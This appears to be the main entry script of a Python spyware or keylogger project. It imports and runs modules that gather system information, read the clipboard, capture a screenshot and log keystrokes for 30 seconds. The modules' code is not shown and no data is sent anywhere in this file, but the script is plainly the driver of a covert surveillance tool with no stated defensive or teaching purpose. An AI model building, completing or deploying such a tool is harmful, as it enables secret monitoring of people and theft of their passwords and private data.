from system_info import get_system_info
from clipdata import get_clipboard_data
from screenshot import capture_screenshot
from keylogger import start_keylogger
def main():
    get_system_info()
    get_clipboard_data()
    capture_screenshot()
    start_keylogger(duration=30)

if __name__ == "__main__": 
    main()
    